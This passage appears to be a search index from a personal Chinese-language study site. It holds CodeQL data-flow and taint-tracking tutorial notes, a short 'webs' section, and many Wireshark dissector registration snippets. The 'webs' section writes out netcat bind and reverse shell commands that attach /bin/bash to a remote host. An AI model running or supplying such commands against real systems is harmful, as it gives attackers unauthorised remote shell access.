\u7684\u521d\u59cb\u5316\u901a\u5e38\u662f\u4e00\u4e2a Stmt \u800c\u4e0d\u662f Expr , \u4f7f\u7528 getEnclosingStmt \u83b7\u53d6Expr\u6700\u63a5\u8fd1\u7684Smt\uff08\u7c7b AssignExpr \u88ab\u7c7b ExprStmt \u5c01\u88c5\uff09 import cpp from AssignExpr e, ForStmt f // the assignment is in the 'for' loop initialization statement where e.getEnclosingStmt() = f.getInitialization() and e.getRValue().getValue().toInt() = 0 and e.getLValue().getType().getUnspecifiedType() instanceof IntegralType select e, \"Assigning the value 0 to an integer, inside a for loop initialization.\"","title":"\u5728'for'\u5faa\u73af\u521d\u59cb\u5316\u4e2d\u67e5\u627e\u8d4b\u503c\u4e3a0"},{"location":"module/semmle-ql/codeql/#for0_1","text":"* \u8868\u793a0\u6b21\u6216\u591a\u6b21\uff0c\u5373\u8fd9\u4e2a Stmt \u672c\u8eab\uff0c\u5b83\u7684 \u7236Stmt\uff0c\u7236Stmt\u7684\u7236Stmt \u7b49\u7b49 import cpp from AssignExpr e, ForStmt f // the assignment is in the for loop body where e.getEnclosingStmt().getParentStmt * () = f.getStmt() and e.getRValue().getValue().toInt() = 0 and e.getLValue().getType().getUnderlyingType() instanceof IntegralType select e, \"Assigning the value 0 to an integer, inside a for loop body.\"","title":"\u5728'for'\u5faa\u73af\u7684\u5faa\u73af\u4f53\u4e2d\u67e5\u627e\u8d4b\u503c\u4e3a0"},{"location":"module/semmle-ql/codeql/#tutorial-conversions-and-classes","text":"Conversions, \u6240\u6709\u8f6c\u6362\u90fd\u4f1a\u66f4\u6539\u8868\u8fbe\u5f0f\u7684\u7c7b\u578b\u3002\u5b83\u4eec\u53ef\u4ee5\u662f\u9690\u5f0f\u8f6c\u6362(\u7531\u7f16\u8bd1\u5668\u751f\u6210)\uff0c\u4e5f\u53ef\u4ee5\u662f\u663e\u5f0f\u8f6c\u6362(\u7531\u7528\u6237\u8bf7\u6c42)\u3002 Expr Conversion Cast CStyleCast StaticCast ConstCastReinterpretCast DynamicCast ArrayToPointerConversion VirtualMemberToFunctionPointerConversion Classes Type UserType\u2014includes classes, typedefs, and enums Class\u2014a class or struct Struct\u2014a struct, which is treated as a subtype of Class TemplateClass\u2014a C++ class template","title":"Tutorial: Conversions and classes"},{"location":"module/semmle-ql/codeql/#tutorial-analyzing-data-flow-in-cc","text":"","title":"Tutorial: Analyzing data flow in C/C++"},{"location":"module/semmle-ql/codeql/#local-data-flow","text":"\u5355\u4e2a\u51fd\u6570\u5185\u90e8\u7684\u6570\u636e\u6d41\u3002\u5728 DataFlow \u6a21\u5757\u4e2d\u5b9a\u4e49\u4e86\u7c7b Node , \u8868\u793a\u6570\u636e\u53ef\u4ee5\u7ecf\u8fc7\u7684\u4efb\u4f55\u5143\u7d20\u3002Node \u5206 ExprNode \u548c ParameterNode \u3002 predicates asExpr and asParameter class Node { /** Gets the expression corresponding to this node, if any. */ Expr asExpr() { ... } /** Gets the parameter corresponding to this node, if any. */ Parameter asParameter() { ... } ... } \u6216\u8005\u4f7f\u7528 predicates exprNode \u548c parameterNode /** * Gets the node corresponding to expression `e`. */ ExprNode exprNode (Expr e) { ... } /** * Gets the node corresponding to the value of parameter `p` at function entry. */ ParameterNode parameterNode (Parameter p) { ... } localFlowStep(Node nodeFrom, Node nodeTo) , \u53ef\u4ee5\u4f7f\u7528'*'\u548c'+'\u9012\u5f52\uff0c localFlow \u76f8\u5f53\u4e8e localFlowStep* \u3002\u6bd4\u5982 DataFlow :: localFlow(DataFlow :: parameterNode(source), DataFlow :: exprNode(sink))","title":"Local data flow"},{"location":"module/semmle-ql/codeql/#using-local-taint-tracking","text":"\u5c40\u90e8\u6c61\u70b9\u8ddf\u8e2a\u901a\u8fc7\u5305\u542b\u975e\u4fdd\u5b58\u503c\u7684\u6d41\u6b65\u9aa4\u6269\u5c55\u4e86\u5c40\u90e8\u6570\u636e\u6d41\u3002\u4f8b\u5982\u4e0b\u9762\uff0c\u8fd9\u79cd\u60c5\u51b5\u4e0bmalloc\u7684\u53c2\u6570\u88ab\u4f1a\u88ab\u6c61\u67d3\u3002 int i = tainted_user_input(); some_big_struct * array = malloc(i * sizeof (some_big_struct)); \u672c\u5730\u6c61\u70b9\u8ddf\u8e2a\u5728\u6a21\u5757 TaintTracking \u4e2d, localTaintStep(DataFlow::Node nodeFrom, DataFlow::Node nodeTo) \u610f\u5473\u7740\uff08?\uff09\u4ece\u8282\u70b9 nodeFrom \u5230\u8282\u70b9 nodeTo \u6709\u4e00\u4e2a\u7acb\u5373\u6c61\u67d3\u4f20\u9012\u8fb9\uff0c localTaint \u60f3\u5f53\u4e8e localTaintStep* TaintTracking::localTaint(DataFlow::parameterNode(source), DataFlow::exprNode(sink))","title":"Using local taint tracking"},{"location":"module/semmle-ql/codeql/#using-global-data-flow","text":"\u5168\u5c40\u6570\u636e\u6d41\u8ddf\u8e2a\u6574\u4e2a\u7a0b\u5e8f\u4e2d\u7684\u6570\u636e\u6d41\uff0c\u56e0\u6b64\u6bd4\u672c\u5730\u6570\u636e\u6d41\u66f4\u5f3a\u5927\u3002\u4f46\u662f\uff0c\u5168\u5c40\u6570\u636e\u6d41\u4e0d\u5982\u672c\u5730\u6570\u636e\u6d41\u7cbe\u786e\uff0c\u800c\u4e14\u6267\u884c\u5206\u6790\u901a\u5e38\u9700\u8981\u5927\u91cf\u7684\u65f6\u95f4\u548c\u5185\u5b58\u3002 \u4f7f\u7528\u5168\u5c40\u6570\u636e\u6d41\u5e93\u6269\u5c55\u7c7b DataFlow::Configuration \uff0c\u5982\u4e0b\u6240\u793a import semmle.code.cpp.dataflow.DataFlow class MyDataFlowConfiguration extends DataFlow :: Configuration { MyDataFlowConfiguration() { this = \"MyDataFlowConfiguration\" } override predicate isSource(DataFlow :: Node source) { ... } override predicate isSink(DataFlow :: Node sink) { ... } } \u5b9a\u4e49\u4ee5\u4e0b\u914d\u7f6e isSource \u5b9a\u4e49\u6570\u636e\u53ef\u80fd\u6d41\u81ea\u4f55\u5904 isSink \u5b9a\u4e49\u6570\u636e\u53ef\u80fd\u6d41\u5411\u67d0\u5904 isBarrier \u53ef\u9009\uff0c\u9650\u5236\u6570\u636e\u6d41 isBarrierGuard \u53ef\u9009\uff0c\u9650\u5236\u6570\u636e\u6d41 isAdditionalFlowStep \u53ef\u9009\uff0c\u6dfb\u52a0\u989d\u5916\u7684\u6d41\u6b65\u9aa4 \u4f7f\u7528\u8c13\u8bcd hasFlow(DataFlow::Node source, DataFlow::Node sink) \u8fdb\u884c\u6570\u636e\u6d41\u5206\u6790: from MyDataFlowConfiguration dataflow, DataFlow::Node source , DataFlow::Node sink where dataflow.hasFlow( source , sink) select source , \"Data flow to $@.\" , sink, sink.toString()","title":"Using global data flow"},{"location":"module/semmle-ql/codeql/#using-global-taint-tracking","text":"\u5168\u5c40\u6c61\u70b9\u8ddf\u8e2a\u4f7f\u7528\u9644\u52a0\u7684\u975e\u4fdd\u5b58\u503c\u7684\u6b65\u9aa4\u6269\u5c55\u4e86\u5168\u5c40\u6570\u636e\u6d41\u3002\u901a\u8fc7\u6269\u5c55 TaintTracking::Configuration \u7c7b\u6765\u4f7f\u7528\u5168\u5c40\u6c61\u67d3\u8ddf\u8e2a\u5e93\uff0c\u5177\u4f53\u5982\u4e0b: import semmle.code.cpp.dataflow.TaintTracking class MyTaintTrackingConfiguration extends TaintTracking :: Configuration { MyTaintTrackingConfiguration() { this = \"MyTaintTrackingConfiguration\" } override predicate isSource(DataFlow :: Node source) { ... } override predicate isSink(DataFlow :: Node sink) { ... } }","title":"Using global taint tracking"},{"location":"module/semmle-ql/codeql/#examples","text":"\u67e5\u627e\u6240\u6709\u4f20\u5165 fopen \u53c2\u65701 \u7684\u8868\u8fbe\u5f0f: import cpp import semmle.code.cpp.dataflow.DataFlow from Function fopen, FunctionCall fc, Expr src where fopen.hasQualifiedName( \"fopen\" ) and fc.getTarget() = fopen and DataFlow::localFlow(DataFlow::exprNode(src), DataFlow::exprNode(fc.getArgument( 0 ))) select src \u67e5\u627e\u4f20\u5165 fopen \u53c2\u65701 \u7684 publi parameter (\u8fd9\u4e2a\u51fd\u6570\u63a5\u6536\u7684\u53c2\u6570\uff0c\u6bd4\u5982 main(int argc, char **argv, char **envp) \u4e2d\u7684argc\uff0c argv, envp): import cpp import semmle.code.cpp.dataflow.DataFlow from Function fopen, FunctionCall fc, Parameter p where fopen.hasQualifiedName( \"fopen\" ) and fc.getTarget() = fopen and DataFlow::localFlow(DataFlow::parameterNode(p), DataFlow::exprNode(fc.getArgument( 0 ))) select p \u67e5\u627e\u5bf9\u683c\u5f0f\u5b57\u7b26\u4e32\u6ca1\u6709\u786c\u7f16\u7801\u7684\u683c\u5f0f\u5316\u51fd\u6570\u7684\u8c03\u7528\u3002 import semmle.code.cpp.dataflow.DataFlow import semmle.code.cpp.commons.Printf from FormattingFunction format, FunctionCall call , Expr formatString where call .getTarget() = format and call .getArgument(format.getFormatParameterIndex()) = formatString and not exists (DataFlow::Node source , DataFlow::Node sink | DataFlow::localFlow( source , sink) and source .asExpr() instanceof StringLiteral and sink.asExpr() = formatString ) select call , \"Argument to \" + format.getQualifiedName() + \" isn't hard-coded.\" import semmle.code.cpp.dataflow.DataFlow class EnvironmentToFileConfiguration extends DataFlow::Configuration { EnvironmentToFileConfiguration() { this = \"EnvironmentToFileConfiguration\" } override predicate isSource(DataFlow::Node source ) { exists ( Function getenv | source .asExpr().(FunctionCall).getTarget() = getenv and getenv.hasQualifiedName( \"getenv\" ) ) } override predicate isSink(DataFlow::Node sink) { exists (FunctionCall fc | sink.asExpr() = fc.getArgument( 0 ) and fc.getTarget().hasQualifiedName( \"fopen\" ) ) } } from Expr getenv, Expr fopen, EnvironmentToFileConfiguration config where config.hasFlow(DataFlow::exprNode(getenv), DataFlow::exprNode(fopen)) select fopen, \"This 'fopen' uses data from $@.\" , getenv, \"call to 'getenv'\"","title":"Examples"},{"location":"module/semmle-ql/ql-examples/","text":"example \u00b6 \u5305\u542b\u8fd4\u56de\u5e38\u91cf\u8bed\u53e5\u7684\u57fa\u672c\u5757 \u00b6 class BasicBlockWithReturn extends BasicBlock { BasicBlockWithReturn() { exists (Literal l| this.contains(any(ReturnStmt r| r.getExpr()=l)) ) } }","title":"Examples"},{"location":"module/semmle-ql/ql-examples/#example","text":"","title":"example"},{"location":"module/semmle-ql/ql-examples/#_1","text":"class BasicBlockWithReturn extends BasicBlock { BasicBlockWithReturn() { exists (Literal l| this.contains(any(ReturnStmt r| r.getExpr()=l)) ) } }","title":"\u5305\u542b\u8fd4\u56de\u5e38\u91cf\u8bed\u53e5\u7684\u57fa\u672c\u5757"},{"location":"module/webs/webs/","text":"webs \u00b6 \u53cd\u5f39shell \u00b6 nc \u00b6 \u6b63\u5411 \u00b6 \u76ee\u6807\u4e3b\u673a nc -lvvp 8888 -e /bin/bash \u6d4b\u8bd5\u4e3b\u673a nc 192 .168.10.1 8888 \u53cd\u5411 \u00b6 \u6d4b\u8bd5\u4e3b\u673a nc -l 8888 \u76ee\u6807\u4e3b\u673a nc -e /bin/bash 192 .168.10.166 8888","title":"webs"},{"location":"module/webs/webs/#webs","text":"","title":"webs"},{"location":"module/webs/webs/#shell","text":"","title":"\u53cd\u5f39shell"},{"location":"module/webs/webs/#nc","text":"","title":"nc"},{"location":"module/webs/webs/#_1","text":"\u76ee\u6807\u4e3b\u673a nc -lvvp 8888 -e /bin/bash \u6d4b\u8bd5\u4e3b\u673a nc 192 .168.10.1 8888","title":"\u6b63\u5411"},{"location":"module/webs/webs/#_2","text":"\u6d4b\u8bd5\u4e3b\u673a nc -l 8888 \u76ee\u6807\u4e3b\u673a nc -e /bin/bash 192 .168.10.166 8888","title":"\u53cd\u5411"},{"location":"module/wireshark/protocol_register/","text":"protocol register \u00b6 a21 \u00b6 proto_a21 = proto_register_protocol( \"A21 Protocol\" , \"A21\" , \"a21\" ); void proto_reg_handoff_a21 ( void ) { dissector_handle_t a21_handle; a21_handle = create_dissector_handle(dissect_a21, proto_a21); gcsna_handle = find_dissector_add_dependency( \"gcsna\" , proto_a21); dissector_add_uint_with_preference( \"udp.port\" , A21_PORT, a21_handle); } aarp \u00b6 proto_aarp = proto_register_protocol( \"Appletalk Address Resolution Protocol\" , \"AARP\" , \"aarp\" ); void proto_reg_handoff_aarp ( void ) { dissector_handle_t aarp_handle; aarp_handle = create_dissector_handle(dissect_aarp, proto_aarp); dissector_add_uint( \"ethertype\" , ETHERTYPE_AARP, aarp_handle); dissector_add_uint( \"chdlc.protocol\" , ETHERTYPE_AARP, aarp_handle); } aasp \u00b6 proto_aasp = proto_register_protocol( \"Aastra Signalling Protocol\" , \"AASP\" , \"aasp\" ); void proto_reg_handoff_aasp ( void ) { dissector_handle_t aasp_handle; aasp_handle = create_dissector_handle(dissect_aasp, proto_aasp); dissector_add_string( \"media_type\" , \"message/x-aasp-signalling\" , aasp_handle); } acap \u00b6 proto_acap = proto_register_protocol( \"Application Configuration Access Protocol\" , \"ACAP\" , \"acap\" ); void proto_reg_handoff_acap ( void ) { dissector_add_uint_with_preference( \"tcp.port\" , TCP_PORT_ACAP, acap_handle); } acn \u00b6 test proto_acn = proto_register_protocol ( \"Architecture for Control Networks\" , /* name */ \"ACN\" , /* short name */ \"acn\" /* abbrev */ ); void proto_reg_handoff_acn ( void ) { /* dissector_handle_t acn_handle; */ /* acn_handle = create_dissector_handle(dissect_acn, proto_acn); */ /* dissector_add_for_decode_as_with_preference(\"udp.port\", acn_handle); */ heur_dissector_add( \"udp\" , dissect_acn_heur, \"ACN over UDP\" , \"acn_udp\" , proto_acn, HEURISTIC_DISABLE); } acp133 \u00b6 test #define PNAME \"ACP133 Attribute Syntaxes\" #define PSNAME \"ACP133\" #define PFNAME \"acp133\" ' ber.oid ' acr122 \u00b6 test acse \u00b6 test #define PNAME \"ISO 8650-1 OSI Association Control Service\" #define PSNAME \"ACSE\" #define PFNAME \"acse\" #define CLPNAME \"ISO 10035-1 OSI Connectionless Association Control Service\" #define CLPSNAME \"CLACSE\" #define CLPFNAME \"clacse\" ' ber.oid ' actrace \u00b6 /* Register protocol */ proto_actrace = proto_register_protocol( \"AudioCodes Trunk Trace\" , \"ACtrace\" , \"actrace\" ); /* The registration hand-off routine */ void proto_reg_handoff_actrace ( void ) { dissector_handle_t actrace_handle; /* Get a handle for the lapd dissector. */ lapd_handle = find_dissector_add_dependency( \"lapd\" , proto_actrace); actrace_handle = create_dissector_handle(dissect_actrace, proto_actrace); dissector_add_uint_with_preference( \"udp.port\" , UDP_PORT_ACTRACE, actrace_handle); } adb_cs \u00b6 proto_adb_cs = proto_register_protocol( \"Android Debug Bridge Client-Server\" , \"ADB CS\" , \"adb_cs\" ); void proto_reg_handoff_adb_cs ( void ) { adb_service_handle = find_dissector_add_dependency( \"adb_service\" , proto_adb_cs); dissector_add_for_decode_as_with_preference( \"tcp.port\" , adb_cs_handle); } adb \u00b6 proto_adb = proto_register_protocol( \"Android Debug Bridge\" , \"ADB\" , \"adb\" ); void proto_reg_handoff_adb ( void ) { adb_service_handle = find_dissector_add_dependency( \"adb_service\" , proto_adb); dissector_add_for_decode_as_with_preference( \"tcp.port\" , adb_handle); dissector_add_for_decode_as( \"usb.device\" , adb_handle); dissector_add_for_decode_as( \"usb.product\" , adb_handle); dissector_add_for_decode_as( \"usb.protocol\" , adb_handle); proto_tcp = proto_get_id_by_filter_name( \"tcp\" ); proto_usb = proto_get_id_by_filter_name( \"usb\" ); } adwin_config \u00b6 test proto_adwin_config = proto_register_protocol( \"ADwin configuration protocol\" , \"ADwin-Config\" , \"adwin_config\" ); /* Required function calls to register the header fields and subtrees used */ proto_register_field_array(proto_adwin_config, hf, array_length(hf)); proto_register_subtree_array(ett, array_length(ett)); } void proto_reg_handoff_adwin_config( void ) { heur_dissector_add( \"udp\" , dissect_adwin_config_udp, \"ADwin-Config over UDP\" , \"adwin_config_udp\" , proto_adwin_config, HEURISTIC_ENABLE); heur_dissector_add( \"tcp\" , dissect_adwin_config_tcp, \"ADwin-Config over TCP\" , \"adwin_config_tcp\" , proto_adwin_config, HEURISTIC_ENABLE); } adwin \u00b6 void proto_reg_handoff_adwin ( void ) { dissector_handle_t adwin_handle; adwin_handle = create_dissector_handle(dissect_adwin, proto_adwin); dissector_add_uint_with_preference( \"udp.port\" , ADWIN_COMM_PORT, adwin_handle); } proto_adwin = proto_register_protocol( \"ADwin communication protocol\" , \"ADwin\" , \"adwin\" ); aeron \u00b6 proto_aeron = proto_register_protocol( \"Aeron Protocol\" , \"Aeron\" , \"aeron\" ); void proto_reg_handoff_aeron ( void ) { aeron_dissector_handle = create_dissector_handle(dissect_aeron, proto_aeron); dissector_add_for_decode_as_with_preference( \"udp.port\" , aeron_dissector_handle); heur_dissector_add( \"udp\" , test_aeron_packet, \"Aeron over UDP\" , \"aeron_udp\" , proto_aeron, HEURISTIC_DISABLE); } afp \u00b6 test proto_afp = proto_register_protocol( \"Apple Filing Protocol\" , \"AFP\" , \"afp\" ); void proto_reg_handoff_afp ( void ) { spotlight_handle = find_dissector_add_dependency( \"afp_spotlight\" , proto_afp); } afs \u00b6 proto_afs = proto_register_protocol( \"Andrew File System (AFS)\" , \"AFS (RX)\" , \"afs\" ); agentx \u00b6 proto_agentx = proto_register_protocol( \"AgentX\" , \"AgentX\" , \"agentx\" ); void proto_reg_handoff_agentx ( void ) { dissector_handle_t agentx_handle; agentx_handle = create_dissector_handle(dissect_agentx, proto_agentx); dissector_add_uint_with_preference( \"tcp.port\" , AGENTX_TCP_PORT, agentx_handle); } aim \u00b6 proto_aim = proto_register_protocol( \"AOL Instant Messenger\" , \"AIM\" , \"aim\" ); dissector_add_uint_range_with_preference( \"tcp.port\" , TCP_PORTS_AIM_DEFAULT, aim_handle); ain \u00b6 #define PNAME \"Advanced Intelligent Network\" #define PSNAME \"AIN\" #define PFNAME \"ain\" ajp13 \u00b6 proto_ajp13 = proto_register_protocol( \"Apache JServ Protocol v1.3\" , \"AJP13\" , \"ajp13\" ); void proto_reg_handoff_ajp13 ( void ) { dissector_handle_t ajp13_handle; ajp13_handle = create_dissector_handle(dissect_ajp13, proto_ajp13); dissector_add_uint_with_preference( \"tcp.port\" , AJP13_TCP_PORT, ajp13_handle); } alcap \u00b6 alcap proto_alcap = proto_register_protocol(alcap_proto_name, alcap_proto_name_short, \"alcap\" ); void proto_reg_handoff_alcap ( void ) { dissector_add_uint( \"mtp3.service_indicator\" , MTP_SI_AAL2, alcap_handle); } AllJoyn \u00b6 ajns aj ardp proto_AllJoyn_ns = proto_register_protocol( \"AllJoyn Name Service Protocol\" , \"AllJoyn NS\" , \"ajns\" ); /* Message protocols */ proto_AllJoyn_mess = proto_register_protocol( \"AllJoyn Message Protocol\" , \"AllJoyn\" , \"aj\" ); proto_register_field_array(proto_AllJoyn_ns, hf, array_length(hf)); proto_register_subtree_array(ett, array_length(ett)); expert_alljoyn = expert_register_protocol(proto_AllJoyn_mess); expert_register_field_array(expert_alljoyn, ei, array_length(ei)); /* ARDP */ /* name, short name, abbrev */ proto_AllJoyn_ardp = proto_register_protocol( \"AllJoyn Reliable Datagram Protocol\" , \"AllJoyn ARDP\" , \"ardp\" ); } void proto_reg_handoff_AllJoyn( void ) { dissector_handle_t alljoyn_handle_ns; dissector_handle_t alljoyn_handle_ardp; alljoyn_handle_ns = create_dissector_handle(dissect_AllJoyn_name_server, proto_AllJoyn_ns); alljoyn_handle_ardp = create_dissector_handle(dissect_AllJoyn_ardp, proto_AllJoyn_ardp); dissector_add_uint_with_preference( \"tcp.port\" , ALLJOYN_NAME_SERVER_PORT, alljoyn_handle_ns); dissector_add_uint_with_preference( \"tcp.port\" , ALLJOYN_MESSAGE_PORT, ); dissector_add_uint_with_preference( \"udp.port\" , ALLJOYN_NAME_SERVER_PORT, alljoyn_handle_ns); /* The ARDP dissector will directly call the AllJoyn message dissector if needed. * This includes the case where there is no ARDP data. */ dissector_add_uint_with_preference( \"udp.port\" , ALLJOYN_MESSAGE_PORT, alljoyn_handle_ardp); } amp \u00b6 amp proto_amp = proto_register_protocol( \"AMP\" , \"AMP\" , \"amp\" ); void proto_reg_handoff_amp ( void ) { dissector_add_uint( \"ccsds.apid\" , AMP_APID, amp_handle); dissector_add_for_decode_as_with_preference( \"udp.port\" , amp_handle); } \"ccsds.apid\" amqp \u00b6 proto_amqp = proto_register_protocol( \"Advanced Message Queueing Protocol\" , \"AMQP\" , \"amqp\" ); void proto_reg_handoff_amqp ( void ) { static guint old_amqps_port = 0 ; static gboolean initialize = FALSE; if ( ! initialize) { /* Register TCP port for dissection */ dissector_add_uint_with_preference( \"tcp.port\" , AMQP_PORT, amqp_tcp_handle); dissector_add_uint( \"amqp.version\" , AMQP_V0_9, create_dissector_handle( dissect_amqpv0_9, proto_amqpv0_9 )); dissector_add_uint( \"amqp.version\" , AMQP_V0_10, create_dissector_handle( dissect_amqpv0_10, proto_amqpv0_10 )); dissector_add_uint( \"amqp.version\" , AMQP_V1_0, create_dissector_handle( dissect_amqpv1_0, proto_amqpv1_0 )); initialize = TRUE; } /* Register for SSL/TLS payload dissection */ if (old_amqps_port != amqps_port) { if (old_amqps_port != 0 ) ssl_dissector_delete(old_amqps_port, amqp_tcp_handle); ssl_dissector_add(amqps_port, amqp_tcp_handle); old_amqps_port = amqps_port; } media_type_subdissector_table = find_dissector_table ( \"media_type\" ); } \"tcp.port\" \"tls.port\" amr \u00b6 amr proto_amr = proto_register_protocol( \"Adaptive Multi-Rate\" , \"AMR\" , \"amr\" ); \"rtp_dyn_payload_type\" \"h245.gef.name\" amt \u00b6 proto_amt = proto_register_protocol( \"Automatic Multicast Tunneling\" , \"AMT\" , \"amt\" ); void proto_reg_handoff_amt ( void ) { dissector_handle_t amt_handle; ip_handle = find_dissector_add_dependency( \"ip\" , proto_amt); amt_handle = create_dissector_handle(dissect_amt, proto_amt); dissector_add_uint_with_preference( \"udp.port\" , AMT_UDP_PORT, amt_handle); } ancp \u00b6 proto_ancp = proto_register_protocol ( \"Access Node Control Protocol\" , \"ANCP\" , \"ancp\" ); void proto_reg_handoff_ancp ( void ) { dissector_handle_t ancp_handle; ancp_handle = create_dissector_handle(dissect_ancp, proto_ancp); dissector_add_uint_with_preference( \"tcp.port\" , ANCP_PORT, ancp_handle); stats_tree_register( \"ancp\" , \"ancp\" , \"ANCP\" , 0 , ancp_stats_tree_packet, ancp_stats_tree_init, NULL); } ans \u00b6 proto_ans = proto_register_protocol( \"Intel ANS probe\" , \"ANS\" , \"ans\" ); void proto_reg_handoff_ans ( void ) { dissector_handle_t ans_handle; ans_handle = create_dissector_handle(dissect_ans, proto_ans); dissector_add_uint( \"ethertype\" , ETHERTYPE_INTEL_ANS, ans_handle); } ansi_637 \u00b6 ansi_637_trans ansi_637_tele proto_ansi_637_tele = proto_register_protocol(ansi_proto_name_tele, \"ANSI IS-637-A Teleservice\" , \"ansi_637_tele\" ); proto_ansi_637_trans = proto_register_protocol(ansi_proto_name_trans, \"ANSI IS-637-A Transport\" , \"ansi_637_trans\" ); ansi_637_trans_app_handle = create_dissector_handle(dissect_ansi_637_trans_app, proto_ansi_637_trans); dissector_add_string( \"media_type\" , \"application/vnd.3gpp2.sms\" , ansi_637_trans_app_handle); ansi_* \u00b6 pass aodv \u00b6 proto_aodv = proto_register_protocol( \"Ad hoc On-demand Distance Vector Routing Protocol\" , \"AODV\" , \"aodv\" ); void proto_reg_handoff_aodv ( void ) { dissector_handle_t aodv_handle; aodv_handle = create_dissector_handle(dissect_aodv, proto_aodv); dissector_add_uint_with_preference( \"udp.port\" , UDP_PORT_AODV, aodv_handle); } aoe \u00b6 proto_aoe = proto_register_protocol( \"ATAoverEthernet\" , \"AOE\" , \"aoe\" ); void proto_reg_handoff_aoe ( void ) { dissector_add_uint( \"ethertype\" , ETHERTYPE_AOE, aoe_handle); } aol \u00b6 proto_aol = proto_register_protocol( \"America Online\" , \"AOL\" , \"aol\" ); void proto_reg_handoff_aol ( void ) { dissector_handle_t aol_handle; aol_handle = create_dissector_handle(dissect_aol,proto_aol); dissector_add_uint_with_preference( \"tcp.port\" ,AOL_PORT,aol_handle); } ap1394 \u00b6 ap1394 proto_ap1394 = proto_register_protocol( \"Apple IP-over-IEEE 1394\" , \"IP/IEEE1394\" , \"ap1394\" ); void proto_reg_handoff_ap1394 ( void ) { dissector_handle_t ap1394_handle; capture_dissector_handle_t ap1394_cap_handle; ethertype_subdissector_table = find_dissector_table( \"ethertype\" ); ap1394_handle = create_dissector_handle(dissect_ap1394, proto_ap1394); dissector_add_uint( \"wtap_encap\" , WTAP_ENCAP_APPLE_IP_OVER_IEEE1394, ap1394_handle); ap1394_cap_handle = create_capture_dissector_handle(capture_ap1394, proto_ap1394); capture_dissector_add_uint( \"wtap_encap\" , WTAP_ENCAP_APPLE_IP_OVER_IEEE1394, ap1394_cap_handle); } \"wtap_encap\" app-pkix-cert \u00b6 proto_cert = proto_register_protocol( \"PKIX CERT File Format\" , \"PKIX Certificate\" , \"pkix-cert\" ); void proto_reg_handoff_cert ( void ) { dissector_handle_t cert_handle; cert_handle = create_dissector_handle(dissect_cert, proto_cert); /* Register the PKIX-CERT media type */ dissector_add_string( \"media_type\" , \"application/pkix-cert\" , cert_handle); } applemidi \u00b6 applemidi #define APPLEMIDI_DISSECTOR_NAME \"Apple Network-MIDI Session Protocol\" #define APPLEMIDI_DISSECTOR_SHORTNAME \"AppleMIDI\" #define APPLEMIDI_DISSECTOR_ABBREVIATION \"applemidi\" void proto_reg_handoff_applemidi ( void ) { applemidi_handle = create_dissector_handle( dissect_applemidi, proto_applemidi ); rtp_handle = find_dissector_add_dependency( \"rtp\" , proto_applemidi ); heur_dissector_add( \"udp\" , dissect_applemidi_heur, \"Apple MIDI over UDP\" , \"applemidi_udp\" , proto_applemidi, HEURISTIC_ENABLE ); } aprs \u00b6 proto_aprs = proto_register_protocol( \"Automatic Position Reporting System\" , \"APRS\" , \"aprs\" ); ar_drone \u00b6 proto_ar_drone = proto_register_protocol( \"AR Drone Packet\" , \"AR Drone\" , \"ar_drone\" ); void proto_reg_handoff_ar_drone ( void ) { dissector_handle_t ar_drone_handle; ar_drone_handle = create_dissector_handle(dissect_ar_drone, proto_ar_drone); heur_dissector_add( \"udp\" , dissect_ar_drone, \"AR Drone over UDP\" , \"ar_drone_udp\" , proto_ar_drone, HEURISTIC_ENABLE); dissector_add_for_decode_as_with_preference( \"udp.port\" , ar_drone_handle); } arcnet \u00b6 arcent proto_arcnet = proto_register_protocol ( \"ARCNET\" , \"ARCNET\" , \"arcnet\" ); void proto_reg_handoff_arcnet ( void ) { dissector_handle_t arcnet_handle, arcnet_linux_handle; capture_dissector_handle_t arcnet_cap_handle; arcnet_handle = create_dissector_handle (dissect_arcnet, proto_arcnet); dissector_add_uint ( \"wtap_encap\" , WTAP_ENCAP_ARCNET, arcnet_handle); arcnet_linux_handle = create_dissector_handle (dissect_arcnet_linux, proto_arcnet); dissector_add_uint ( \"wtap_encap\" , WTAP_ENCAP_ARCNET_LINUX, arcnet_linux_handle); proto_ipx = proto_get_id_by_filter_name( \"ipx\" ); arcnet_cap_handle = create_capture_dissector_handle(capture_arcnet, proto_arcnet); capture_dissector_add_uint( \"wtap_encap\" , WTAP_ENCAP_ARCNET_LINUX, arcnet_cap_handle); arcnet_cap_handle = create_capture_dissector_handle(capture_arcnet_has_exception, proto_arcnet); capture_dissector_add_uint( \"wtap_encap\" , WTAP_ENCAP_ARCNET, arcnet_cap_handle); ip_cap_handle = find_capture_dissector( \"ip\" ); arp_cap_handle = find_capture_dissector( \"arp\" ); } \"wtap_encap\" armagetronad \u00b6 proto_armagetronad = proto_register_protocol( \"The Armagetron Advanced OpenGL Tron clone\" , \"Armagetronad\" , \"armagetronad\" ); void proto_reg_handoff_armagetronad ( void ) { dissector_add_uint_range_with_preference( \"udp.port\" , ARMAGETRONAD_UDP_PORT_RANGE, armagetronad_handle); } arp \u00b6 arp proto_arp = proto_register_protocol( \"Address Resolution Protocol\" , \"ARP/RARP\" , \"arp\" ); artemis \u00b6 proto_artemis = proto_register_protocol ( \"Artemis Core Protocol\" , \"Artemis\" , \"artemis\" ); void proto_reg_handoff_artemis ( void ) { static gboolean initialize = FALSE; if ( ! initialize) { /* Register TCP port for dissection */ dissector_add_uint_with_preference( \"tcp.port\" , ARTEMIS_PORT, artemis_tcp_handle); initialize = TRUE; } } artnet \u00b6 artnet proto_artnet = proto_register_protocol( \"Art-Net\" , \"ARTNET\" , \"artnet\" ); proto_register_field_array(proto_artnet, hf, array_length(hf)); proto_register_subtree_array(ett, array_length(ett)); } void proto_reg_handoff_artnet( void ) { dissector_handle_t artnet_handle; artnet_handle = create_dissector_handle(dissect_artnet, proto_artnet); dissector_add_for_decode_as_with_preference( \"udp.port\" , artnet_handle); rdm_handle = find_dissector_add_dependency( \"rdm\" , proto_artnet); dmx_chan_handle = find_dissector_add_dependency( \"dmx-chan\" , proto_artnet); heur_dissector_add( \"udp\" , dissect_artnet_heur, \"ARTNET over UDP\" , \"artnet_udp\" , proto_artnet, HEURISTIC_ENABLE); } aruba-adp \u00b6 proto_aruba_adp = proto_register_protocol( \"Aruba Discovery Protocol\" , \"ADP\" , \"adp\" ); void proto_reg_handoff_aruba_adp ( void ) { dissector_handle_t adp_handle; adp_handle = create_dissector_handle(dissect_aruba_adp, proto_aruba_adp); dissector_add_uint_with_preference( \"udp.port\" , UDP_PORT_ADP, adp_handle); } aruba_erm \u00b6 proto_aruba_erm = proto_register_protocol(PROTO_LONG_NAME, \"ARUBA_ERM\" , \"aruba_erm\" ); \"udp.port\" ? aruba_iap \u00b6 proto_aruba_iap = 